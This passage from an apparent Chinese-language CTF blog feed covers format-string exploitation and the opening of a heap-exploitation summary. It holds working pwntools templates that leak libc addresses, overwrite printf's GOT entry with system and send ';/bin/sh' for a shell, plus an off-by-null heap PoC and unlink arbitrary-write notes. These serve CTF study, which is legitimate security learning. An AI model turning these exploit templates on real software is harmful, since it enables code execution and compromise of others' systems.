write_size=&#x27;byte&#x27;)</span><br><span class="line">b&#x27;%19c%12$hhn%36c%13$hhn%131c%14$hhn%4c%15$hhn\x03\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x00000001&#125;, write_size=&#x27;byte&#x27;)</span><br><span class="line">b&#x27;c%3$naaa\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: b&quot;\xff\xff\x04\x11\x00\x00\x00\x00&quot;&#125;, write_size=&#x27;short&#x27;)</span><br><span class="line">b&#x27;%327679c%7$lln%18c%8$hhn\x00\x00\x00\x00\x03\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(10, &#123;0x404048 : 0xbadc0ffe, 0x40403c : 0xdeadbeef&#125;, no_dollars=True)</span><br><span class="line">b&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%125c%hhn%17c%hhn%32c%hhn%17c%hhn%203c%hhn%34c%hhn%3618c%hnacccc&gt;@@\x00cccc=@@\x00cccc?@@\x00cccc&lt;@@\x00ccccK@@\x00ccccJ@@\x00ccccH@@\x00&#x27;</span><br><span class="line">fmtstr_payload(6, &#123;0x404048 : 0xbadbad00&#125;, no_dollars=True)</span><br><span class="line">b&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%229c%hhn%173c%hhn%13c%hhn%33c%hhnccccH@@\x00ccccI@@\x00ccccK@@\x00ccccJ@@\x00&#x27;</span><br><span class="line">fmtstr_payload(6, &#123;0x4040 : 0xbadbad00, 0x4060: 0xbadbad02&#125;, no_dollars=True)</span><br><span class="line">b&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%212c%hhn%173c%hhn%13c%hhn%33c%hhn%39c%hhn%171c%hhn%13c%hhn%33c%hhnacccc@@\x00\x00ccccA@\x00\x00ccccC@\x00\x00ccccB@\x00\x00cccc`@\x00\x00cccca@\x00\x00ccccc@\x00\x00ccccb@\x00\x00&#x27;</span><br></pre></td></tr></table></figure>
<h1 id="ctf-中的题型">CTF 中的题型</h1>
<h2 id="栈上">栈上</h2>
<h3 id="位">32位</h3>
<blockquote>
<p>最基础的题目，fmtstr_payload一把梭，模板如下</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 确认偏移量</span></span><br><span class="line">payload = <span class="string">&#x27;%p-&#x27;</span>*<span class="number">10</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设 offset=6，泄露libc基址</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload    = p32(printf_got) + <span class="string">b&#x27;%6$s&#x27;</span></span><br><span class="line"><span class="comment"># payload  = b&#x27;%7$s&#x27; + p32(printf_got)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确认libc</span></span><br><span class="line">printf_addr = u32(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">3</span>:])</span><br><span class="line">libc        = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br><span class="line">libc_base   = printf_addr - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收程序信息，向程序发送payload</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf_got:system_addr&#125;,numbwritten=<span class="number">0</span>,write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提权</span></span><br><span class="line">io.sendline(<span class="string">&#x27;;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="位-1">64位</h3>
<blockquote>
<p>由于许多地址只有六字节，所以为了对齐八字节，我们需要用''来填充，但''会截断
printf 的输出，所以我们需要让 printf 先输出格式化字符.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确认偏移量</span></span><br><span class="line">payload = <span class="string">&#x27;%p-&#x27;</span>*<span class="number">10</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设 offset=6，泄露libc基址</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload  = <span class="string">b&#x27;%7$sAAAA&#x27;</span> + p64(printf_got)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确认libc</span></span><br><span class="line">printf_addr = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc        = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br><span class="line">libc_base   = printf_addr - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收程序信息，向程序发送payload</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf_got:system_addr&#125;,numbwritten=<span class="number">0</span>,write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提权</span></span><br><span class="line">io.sendline(<span class="string">&#x27;;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="非栈上bss段">非栈上(BSS段)</h2>
<p>2023moeCTF的第三道fmt就是这种题目，exp在本地，后续有时间更新</p>
<h2 id="特殊情况">特殊情况</h2>
<h3 id="一次printf就返回">一次printf就返回</h3>
<blockquote>
<p>printf 的要求十分严格，通常有两种做法</p>
</blockquote>
<ol type="1">
<li>要求：栈上有一串具有三个函数的rbp的链，NO PIE，libc已知
<ol type="1">
<li>做法：在栈上布满one_gadget，然后找到一条带有3个rbp的链，修改中间一个
node 的低字节，让其指向的rbp变低，进而在返回时可以直接返回og</li>
<li>本质: 利用 ret(实质是 pop rip) 时返回栈帧上的一条指令</li>
</ol></li>
<li><a
href="https://www.freebuf.com/articles/system/385029.html">打fini_array（未学习）</a></li>
</ol>
<h3 id="full-relro">FULL RELRO</h3>
<blockquote>
<p>FULL RELRO 意味着我们不能修改 got 表，所以我们需要修改返回地址</p>
</blockquote>
<p>要求：可以 printf
的次数较多(至少多于四次)，可以让我们将返回地址修改为 one_gadget</p>
<h3 id="piecanary-bypass">PIE/Canary bypass</h3>
<blockquote>
<p>假设调用链为 main-&gt;func-&gt;printf，而在 func 中存放着 fmt，则栈中
fmt
上方不远处一定有调用printf语句的下一句(PC+4)，即返回地址，和canary</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">假设偏移量为6，栈构造如下</span><br><span class="line">---printf栈帧---</span><br><span class="line">................</span><br><span class="line"> printf_canary    &lt;- offset = 3</span><br><span class="line">   printf_rbp     &lt;- offset = 4</span><br><span class="line">printf_ret_addr   &lt;- offset = 5</span><br><span class="line">---printf栈帧---</span><br><span class="line"></span><br><span class="line">----func栈帧----</span><br><span class="line">      fmt         &lt;- offset = 6</span><br><span class="line">----func栈帧----</span><br><span class="line"></span><br><span class="line">----main栈帧----</span><br><span class="line">...............</span><br><span class="line">----main栈帧----</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">泄露 pie_base &amp; canary</span></span><br><span class="line">payload = &#x27;%3$p-%5$p-END&#x27;</span><br><span class="line">io.sendline(payload)</span><br><span class="line">func_addr,canary = [int(x,16) for x in io.recvuntil(&#x27;END&#x27;)[-35:-4].split(b&#x27;-&#x27;)]</span><br><span class="line">ret_offset = </span><br><span class="line">pie_base   = func_addr - ret_offset</span><br></pre></td></tr></table></figure>
<h1 id="appendix">Appendix</h1>
<h2
id="pwnlib.fmtstr.fmtstr_payload源码">pwnlib.fmtstr.fmtstr_payload源码</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fmtstr_payload</span> (</span><br><span class="line">        offset,              <span class="comment"># 字符串在栈上的偏移量</span></span><br><span class="line">        writes,              <span class="comment"># &#123;target_addr:int_to_write&#125; 要写入的数字</span></span><br><span class="line">        numbwritten=<span class="number">0</span>,       <span class="comment"># printf 已经打印的字符数量</span></span><br><span class="line">        write_size=<span class="string">&#x27;byte&#x27;</span>,   <span class="comment"># 写入字节的大小</span></span><br><span class="line">        write_size_max=<span class="string">&#x27;long&#x27;</span>, <span class="comment"># </span></span><br><span class="line">        overflows=<span class="number">16</span>,        <span class="comment"># </span></span><br><span class="line">        strategy=<span class="string">&quot;small&quot;</span>,    <span class="comment"># 默认small，如果追求速度可以用fast模式</span></span><br><span class="line">        badbytes=<span class="built_in">frozenset</span>(),  <span class="comment"># </span></span><br><span class="line">        offset_bytes=<span class="number">0</span>,      <span class="comment"># </span></span><br><span class="line">        no_dollars=<span class="literal">False</span>     <span class="comment"># 是否有 $ 符号,比如不用 &#x27;%996$n&#x27;</span></span><br><span class="line">    ):</span><br><span class="line"></span><br><span class="line">    sz = WRITE_SIZE[write_size]</span><br><span class="line">    szmax = WRITE_SIZE[write_size_max]</span><br><span class="line">    all_atoms = make_atoms(writes, sz, szmax, numbwritten, overflows, strategy, badbytes)</span><br><span class="line"></span><br><span class="line">    fmt = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">        data_offset = (offset_bytes + <span class="built_in">len</span>(fmt)) // context.<span class="built_in">bytes</span></span><br><span class="line">        fmt, data = make_payload_dollar(offset + data_offset, all_atoms, numbwritten=numbwritten, no_dollars=no_dollars)</span><br><span class="line">        fmt = fmt + cyclic((-<span class="built_in">len</span>(fmt)-offset_bytes) % context.<span class="built_in">bytes</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(fmt) + offset_bytes == data_offset * context.<span class="built_in">bytes</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;this is a bug ... format string building did not converge&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> fmt + data</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF_Theory</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - Heap Exploit Summary</title>
    <url>/posts/56319.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
总结一下 Heap 的相关内容，便于后续调用
</blockquote>
<span id="more"></span>
<p><a href="https://github.com/iromise/glibc/tree/master/malloc">Github:
ptmalloc 源码(只有 malloc 部分)</a></p>
<p><a href="https://www.jianshu.com/p/1a966b62b3d4">source code
compilation &amp;&amp; all libc debs</a></p>
<h1 id="目录">[0] 目录</h1>
<ol type="1">
<li><a href="#1-patchelf的使用方式">Patchelf的使用方式</a></li>
<li><a href="#2-详解-申请与释放-chunk未完成">详解 '申请与释放
chunk'</a></li>
<li><a href="#3-chunk-extend-and-overlapping">chunk Extend and
Overlapping</a></li>
<li><a href="#4-use-after-free">Use After Free</a></li>
<li><a href="#5-double-free">Double Free</a></li>
<li><a href="#6-unlink">Unlink</a></li>
<li><a href="#7-series-of-bin">Series of Bin</a>
<ul>
<li><a href="#7-1-tcachebin">7-1 Tcachebin</a></li>
<li><a href="#7-2-fastbin">7-2 Fastbin</a></li>
<li><a href="#7-3-unsortedbin">7-3 Unsortedbin</a></li>
<li><a href="#7-4-largebin-attack">7-4 Largebin Attack</a></li>
</ul></li>
<li><a href="#8-series-of-house">Series of House</a>
<ul>
<li><a href="#8-1-house-of-orange">8-1 House of Orange</a></li>
<li><a href="#8-2-house-of-force-hof">8-2 House of Force</a></li>
<li><a href="#8-3-house-of-botcake">8-3 House of botcake</a></li>
<li><a href="#8-4-house-of-banana">8-4 House of banana</a></li>
<li><a href="#8-5-house-of-pig">8-5 House of pig</a></li>
</ul></li>
</ol>
<h1 id="patchelf的使用方式">[1] Patchelf的使用方式</h1>
<blockquote>
<p>在本地调试堆题时，不同的 libc 版本会有不同的 heap 管理器来管理
heap，因此我们需要将本地的 elf 文件的链接部分 patch
一下，使其与远程链接的 libc 文件保持一致。</p>
</blockquote>
<h2 id="确认libc">[1-1] 确认libc</h2>
<blockquote>
<p>有时题目只给一个 libc.so.6，此时 patchelf 后程序会因为缺少 ld
文件而无法正常运行，因此我们需要通过这个 libc.so.6 来确认程序使用的 libc
版本，然后自己下载对应 libc 包并 patch</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">puts_offset = libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_offset = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">printf_offset = libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_offset      ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(puts_offset))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;read_offset     ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(read_offset))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;printf_offset   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(printf_offset))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">puts_offset     ---&gt;    0x84420</span></span><br><span class="line"><span class="string">read_offset     ---&gt;    0x10dfc0</span></span><br><span class="line"><span class="string">printf_offset   ---&gt;    0x61c90</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># puts    ---&gt;    420</span></span><br><span class="line"><span class="string"># read    ---&gt;    fc0</span></span><br><span class="line"><span class="string"># printf  ---&gt;    c90</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>将打印出来的三个偏移量的后三位，拿到 <a
href="https://libc.blukat.me/?q=puts%3A420%2Cread%3Afc0%2Cprintf%3Ac90">libcSearcher</a>
去查即可</p>
<h2 id="libc-包的下载">[1-2] libc 包的下载</h2>
<p>patchelf没有的包可以在<a
href="https://www.jianshu.com/p/1a966b62b3d4">这里</a>下载</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以下操作均在文件夹 glibc-all-in-one 中完成</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看有什么版本的 libc 可以下载</span></span><br><span class="line">./update_list // 更新 list</span><br><span class="line">cat list</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载所需要的 libc 包</span></span><br><span class="line">./download 2.35-0ubuntu3_amd64</span><br></pre></td></tr></table></figure>
<blockquote>
<p>有时我们需要的 libc 包不在 list
中，我们可以自己尝试解构命令来下载。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">访问https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/，查看所有可以下载的 libc 版本</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/ 也可以</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载压缩包(到文件夹glibc-all-in-one/debs)以后用 extract 命令解压缩</span></span><br><span class="line">./extract debs/libc6_2.26-0ubuntu2_i386.deb /tmp/test</span><br></pre></td></tr></table></figure>
<h2 id="patch-elf文件">[1-3] patch elf文件</h2>
<blockquote>
<p>识别需要 patch 的文件 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[path/to/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64]</span><br><span class="line">└─$ ls</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">找到以下文件</span><br><span class="line">ld-linux-x86-64.so.2  # ld-2.23.so 也行</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>tip1：高版本的libc库没有 <code>ld-2.23.so</code> 这种文件，但它与
<code>ld-linux-x86-64.so.2</code>
等价，都指向相同的动态链接器文件，他们实际上是同一个文件的不同名称。</p>
<p>tip2：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">被patch的elf文件: Pwn</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置动态链接器 ld.so</span></span><br><span class="line">patchelf --set-interpreter /mnt/e/EdgeDownload/libcTools/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-linux-x86-64.so.2 pwn </span><br><span class="line">patchelf --set-interpreter ./ld-linux-x86-64.so.2 pwn </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置链接库</span> </span><br><span class="line">patchelf --set-rpath  /mnt/e/EdgeDownload/libcTools/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ pwn</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置动态链接器与动态链接库</span></span><br><span class="line">patchelf --set-interpreter /mnt/e/EdgeDownload/libcTools/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-2.23.so --replace-needed libc.so.6 /mnt/e/EdgeDownload/libcTools/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6 pwn</span><br><span class="line">patchelf --set-interpreter ./ld-2.23.so --replace-needed libc.so.6 ./libc.so.6 pwn</span><br></pre></td></tr></table></figure>
<h2 id="恢复-debug-symbol">[1-4] 恢复 debug symbol</h2>
<h3 id="patchelf-list-中有相关包">[1-4-1] patchelf list 中有相关包</h3>
<blockquote>
<p>其实没有相关包的话用最近版本的 libc 也能.debug</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载对应 libc 包</span></span><br><span class="line">./download xxx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">复制 /libs/2.xx-xubuntuxx_xxx/.debug/.build-id 的绝对路径，在gdb时</span></span><br><span class="line">loadfolder /path/to/libs/2.xx-xubuntuxx_xxx/.debug/.build-id</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果 download 拉不下来，去对应网站找带dbg（如libc6-dbg_2.23-0ubuntu3_i386.deb）的包下载下来，将/data/usr/lib/debug/.build-id复制到 /libs/2.xx-xubuntuxx_xxx/.debug 下即可</span></span><br></pre></td></tr></table></figure>
<h3 id="list-中没有相关包">[1-4-2] list 中没有相关包</h3>
<p>查看<a
href="https://www.jianshu.com/p/1a966b62b3d4">这个教程</a>编译源码来恢复符号</p>
<p><a href="https://www.cnblogs.com/LynneHuan/p/17822138.html">docker
恢复符号</a></p>
<h2 id="恢复源码与patchelf关系不大">[1-5]
恢复源码(与patchelf关系不大)</h2>
<p><a href="https://zhuanlan.zhihu.com/p/65873040">看这篇</a></p>
<h1 id="详解-申请与释放-chunk未完成">[2] 详解 '申请与释放
chunk'(未完成)</h1>
<h2 id="申请-chunk">[2-1] 申请 chunk</h2>
<ol start="0" type="1">
<li><p>如果是第一次申请，则 malloc 一块内存来存放
<code>tcache_perthread_struct</code></p></li>
<li><p>查看要申请的 chunk 的大小，记作 <code>SIZE</code></p></li>
<li><p>检查各种 bin</p>
<ol type="1">
<li>(libc2.26及之后) <code>SIZE</code> 属于 [0x0,small bin size)，检查
tcachebin，有合适的 chunk 则返回</li>
<li>根据版本有不同选择
<ol type="1">
<li>(libc2.26之前)<code>SIZE</code> 属于 [0x0,0x78]，检查
fastbins，有合适的 chunk 则检查 size 域是否正确，正确则返回</li>
<li>(libc2.26及之后)<code>SIZE</code> 属于 [0x0,0x78]，将对应 fastbin
一整条链挪进 tcachebin 的对应链上，并取出 newest_chunk 返回</li>
</ol></li>
<li>smallBin largeBin 还没学</li>
<li>检查 unsortedBin，如果 <code>SIZE</code> 小于 "unsortedbin 的某个
chunk 的 size"，则:
<ol type="1">
<li>以0x10为基本单位切割出申请的 chunk 并返回，剩下的部分叫做 last
remainder chunk</li>
</ol></li>
</ol></li>
<li><p>检查 topchunk，如果 <code>SIZE</code> 小于 "topchunk 的
size"，则:</p>
<ol type="1">
<li>以0x10为基本单位切割出申请的 chunk 并返回</li>
</ol></li>
<li><p>用 Brk 再拉几页内存出来，还没学</p></li>
</ol>
<h2 id="释放-chunk">[2-2] 释放 chunk</h2>
<ol type="1">
<li>查看要释放的 chunk 的大小，记作<code>SIZE</code></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 猜测，尚不确定</span><br><span class="line">n. 检查 prev_inuse 位，若为0，则:  </span><br><span class="line">    1. 如果 chunk 不在 fastbin/tcachebin，则前向合并，并继续递归检验 prev_inuse</span><br><span class="line">    2. 如果 chunk 在 fastbin/tcachebin，则获取前一个 chunk 的 size，并存到 prev_size 域</span><br></pre></td></tr></table></figure>
<h1 id="chunk-extend-and-overlapping">[3] chunk Extend and
Overlapping</h1>
<h2 id="分类">[3-1] 分类</h2>
<p>本质是通过修改 chunk_header 来实现用 chunk1 控制 chunk2
的内容的效果。分为前向和后向两种</p>
<h3 id="后向-overlap">[3-1-1] 后向 Overlap</h3>
<p>堆区模型： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---chunk1(0x21)---</span><br><span class="line">---chunk2(0x21)---</span><br></pre></td></tr></table></figure></p>
<p>本质：修改低地址 chunk1 的 size 域，在修改 chunk1 内容时会越界修改掉
chunk2 的内容</p>
<h3 id="前向-overlap">[3-1-2] 前向 Overlap</h3>
<p>堆区模型： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---chunk1(0x81)---</span><br><span class="line">---chunk2(0x21)---</span><br><span class="line">---chunk3(0x21)---</span><br><span class="line">---chunk4(0x81)---</span><br><span class="line">---chunk5(0x21)---防止 top_chunk 合并</span><br></pre></td></tr></table></figure></p>
<p>本质：修改高地址 chunk4 的 pre_inuse 域和 prev_size 域，通过 free 时
bins 的机制来进行前向合并 chunk1 ，从而再次 malloc 时可以控制中间的
chunk2 与 chunk3</p>
<h2 id="具体利用手法">[3-2] 具体利用手法</h2>
<h3 id="off-by-null">[3-2-1] off-by-null</h3>
<h4 id="概述">[3-2-1-1] 概述</h4>
<p><code>off-by-null</code>
指的是程序在写入堆的时候，会在输入字符的最后用<code>'\x00'</code>截断</p>
<p>通过申请 xxx8h 大小的 chunk，当我们输入 xxx8 个字节时，程序会将下一个
chunk 的 size 域的低一个字节覆盖为0，</p>
<p>这样的操作会让 prev_inuse 位置零，使程序误以为前一个 chunk
已经被释放，从而与前 n 个 chunk 发生合并</p>
<h4 id="poc">[3-2-1-2] POC</h4>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x80</span>) <span class="comment"># 0 0x91 </span></span><br><span class="line">alloc(<span class="number">0x18</span>) <span class="comment"># 1 0x21</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment"># 2 0x91</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment"># 3 0x21 防止合并</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0xb0</span>) <span class="comment"># 0x20 + 0x90 = 0xb0</span></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># show(0) 可以 leak main_arena</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># alloc(4,0xa0) 可以切割 chunk0-chunk2，从而修改 chunk1，</span></span><br><span class="line"><span class="comment"># 进而造成 tcachebin poisoning / fastbin attack</span></span><br></pre></td></tr></table></figure>
<h1 id="use-after-free">[4] Use After Free</h1>
<h2 id="概述-1">[4-1] 概述</h2>
<blockquote>
<p>libc2.26 - libc2.31，主要是 tcachebin UAF</p>
</blockquote>
<p>见 Kinds of Bin -&gt; Tcachebin -&gt; UAF</p>
<h1 id="double-free">[5] Double Free</h1>
<h2 id="概述-2">[5-1] 概述</h2>
<blockquote>
<p>libc2.27之前，主要是 fastbin double free</p>
</blockquote>
<p>见 Kinds of Bin -&gt; Fastbin</p>
<blockquote>
<p>libc2.27-2.28，主要是 tcachebin double free</p>
</blockquote>
<blockquote>
<p>libc2.29-libc2.31，tcachebin加入了检查机制，所以仍然考虑用
fastbin/smallbin</p>
</blockquote>
<p>见 Kinds of Bin -&gt; Tcachebin</p>
<h1 id="unlink">[6] Unlink</h1>
<h2 id="利用条件">[6-1] 利用条件</h2>
<ol type="1">
<li><p>free 的 <code>chunkC</code> 前后 chunk 的 fd/bk 可以被修改</p>
<ol type="1">
<li><p>UAF，free 以后修改 fd/bk</p></li>
<li><p>堆溢出，伪造 chunk，修改 fd/bk 的同时修改 <code>chunk</code> 的
prev_size 和 prev_inuse</p></li>
</ol></li>
<li><p>没见过太多案例不太会概括这一点</p>
<ol type="1">
<li>pie 没开，bss 段的 heap_list 可以被拿来当做 fd/bk</li>
</ol></li>
</ol>
<h2 id="原理">[6-2] 原理</h2>
<p>ctfwiki 上的 FD BK fd bk 感觉写的乱七八糟的，重新整理一下思路</p>
<p>unlink 概括来讲，就是利用 free
时的机制，实现任意地址写非任意值的技术</p>
<h3 id="触发-unlink">[6-2-1] 触发 unlink</h3>
<ol type="1">
<li><p>在释放 size 大于 smallbin 最小值的 chunkC 时，ptmalloc 会检查
chunkC 物理相邻的前后两个 chunk
是否正在被使用，如果没被使用，则会触发前向/后向合并，从而触发 unlink</p>
<ol type="1">
<li><p>前向合并：chunkC 的 prev_size 为前一个 chunk 的 size，且 chunkC
的 prev_inuse 位置零</p></li>
<li><p>后向合并：chunkC 的后一个 chunk 已经在 binlist 当中</p></li>
</ol></li>
</ol>
<h3 id="古早版本">[6-2-2] 古早版本</h3>
<p>假设在一个双向链表 bin 中，有 BK &lt;=&gt; CUR &lt;=&gt; FD</p>
<p>三个 chunk 的关系为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BK.fd == &amp;(CUR.prev_size)</span><br><span class="line">CUR.bk == &amp;(BK.prev_size)</span><br><span class="line">CUR.fd == &amp;(FD.prev_size)</span><br><span class="line">FD.bk == &amp;(CUR.prev_size)</span><br></pre></td></tr></table></figure>
<center>
<img src="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/implementation/figure/unlink_smallbin_intro.png" width=370 height=290 />
</center>
<p>在<strong>古早</strong>的版本中，unlink 的具体过程为
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CUR.bk-&gt;fd = CUR.fd # CUR 的后一个 chunk 的 fd 指针指向 CUR 的前一个 chunk</span><br><span class="line">CUR.fd-&gt;bk = CUR.bk # CUR 的前一个 chunk 的 bk 指针指向 CUR 的后一个 chunk</span><br></pre></td></tr></table></figure></p>
<p>如果我们修改 CUR 的 fd 和 bk 指针，就可以实现
<code>Any address write</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SIZE 在32位为 4，64位为8</span></span><br><span class="line"><span class="comment">// target_addr + 0*SIZE = &amp;(fakechunk.prev_size)</span></span><br><span class="line"><span class="comment">// target_addr + 1*SIZE = &amp;(fakechunk.size)</span></span><br><span class="line"><span class="comment">// target_addr + 2*SIZE = &amp;(fakechunk.fd)</span></span><br><span class="line"><span class="comment">// target_addr + 3*SIZE = &amp;(fakechunk.bk)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改 CUR 的 fd 和 bk 指针</span></span><br><span class="line">CUR.fd = target_addr - <span class="number">3</span>*SIZE</span><br><span class="line">CUR.bk = expect_value</span><br><span class="line"></span><br><span class="line"><span class="comment">// CUR.fd-&gt;bk = CUR.bk</span></span><br><span class="line">*(target_addr - <span class="number">3</span>*SIZE + <span class="number">3</span>*SIZE) = expect_value + <span class="number">2</span>*SIZE</span><br><span class="line"></span><br><span class="line"><span class="comment">// CUR.bk-&gt;fd = CUR.fd   ---&gt;   要求 expect_value + 8 指向的内存可写</span></span><br><span class="line">*(expect_value + <span class="number">2</span>*SIZE) = target_addr - <span class="number">3</span>*SIZE</span><br></pre></td></tr></table></figure>
<h3 id="加入-check-以后">[6-2-3] 加入 check 以后</h3>
<ol type="1">
<li><p>check1</p>
<ol type="1">
